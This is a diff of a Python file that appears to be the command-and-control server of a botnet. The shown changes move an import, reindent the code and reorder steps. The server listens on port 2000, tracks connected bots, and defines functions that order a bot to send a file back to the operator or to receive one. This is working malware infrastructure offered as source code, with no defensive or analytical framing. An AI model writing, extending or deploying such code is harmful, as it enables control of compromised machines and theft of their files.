@@ -2,11 +2,11 @@
 
 import sys
 import socket
+from socket import AF_INET, SOCK_STREAM
 from common import pr, clear, get_cipher
 from common import Encode, Decode, Send, Receive
 
 # server socket
-from socket import AF_INET, SOCK_STREAM
 server = socket.socket(AF_INET, SOCK_STREAM)
 server.bind(('', 2000))
 server.listen()
@@ -16,22 +16,22 @@ socks = []
 clients = []
 active = False
 
-# CnC requires bot to send file
+# CnC server requires bot to send file
 def download(sock, file):
-    try:
-        f = open(file, 'wb')
-    except IOError:
-        pr('Error opening file.')
-        return
+  Send(sock, 'download ' + file)
+  pr('Downloading ' + file)
 
-    Send(sock, 'download ' + file)
-    pr('Downloading ' + file)
+  try:
+    f = open(file, 'wb')
+  except IOError:
+    pr('Error opening file.')
+    return
 
-    d = Receive(sock)
-    f.write(d)
-    f.close()
+  d = Receive(sock)
+  f.write(d)
+  f.close()
 
-# CnC requires bot to receive file
+# CnC server requires bot to receive file
 def upload(sock, file):
     try:
         f = open(file, 'rb')
